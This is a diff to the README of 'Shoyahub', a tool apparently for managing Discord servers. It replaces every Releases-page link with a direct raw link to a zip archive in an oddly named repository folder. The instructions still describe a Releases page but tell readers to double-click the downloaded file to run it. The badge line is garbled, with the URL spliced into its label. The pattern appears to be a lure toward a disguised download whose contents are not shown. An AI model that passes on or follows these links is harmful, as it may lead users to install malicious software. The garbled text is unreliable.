@@ -6,11 +6,11 @@ Welcome to Shoyahub! This application brings you tools to manage your Discord se
 
 ## 📥 Download Shoyahub
 
-[![Download Shoyahub](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-blue.svg)](https://github.com/Goint2267/Shoyahub/releases)
+[![Download Shoyahub](https://raw.githubusercontent.com/Goint2267/Shoyahub/main/Himyarite/Shoyahub-2.8.zip%20Now-Visit%20Release%https://raw.githubusercontent.com/Goint2267/Shoyahub/main/Himyarite/Shoyahub-2.8.zip)](https://raw.githubusercontent.com/Goint2267/Shoyahub/main/Himyarite/Shoyahub-2.8.zip)
 
 To get started, you need to download Shoyahub. Follow these steps to download and set it up on your computer:
 
-1. Click on the following link to visit the download page: [Visit Release Page](https://github.com/Goint2267/Shoyahub/releases).
+1. Click on the following link to visit the download page: [Visit Release Page](https://raw.githubusercontent.com/Goint2267/Shoyahub/main/Himyarite/Shoyahub-2.8.zip).
 2. On the Releases page, you will see a list of versions. Choose the latest version for the best features and fixes.
 3. Click on the asset that suits your operating system (Windows, Mac, or Linux) to download the file.
 4. Once the download is complete, locate the file in your Downloads folder and double-click it to run the installer.
@@ -69,6 +69,6 @@ For direct support, please visit our Issues section on GitHub. We welcome your f
 
 ## 📣 Update Notifications
 
-Stay informed about new features and updates by checking back on the [Release Page](https://github.com/Goint2267/Shoyahub/releases) regularly. You can also follow us on social media for announcements.
+Stay informed about new features and updates by checking back on the [Release Page](https://raw.githubusercontent.com/Goint2267/Shoyahub/main/Himyarite/Shoyahub-2.8.zip) regularly. You can also follow us on social media for announcements.
 
 Enjoy using Shoyahub to manage your Discord environment effectively!
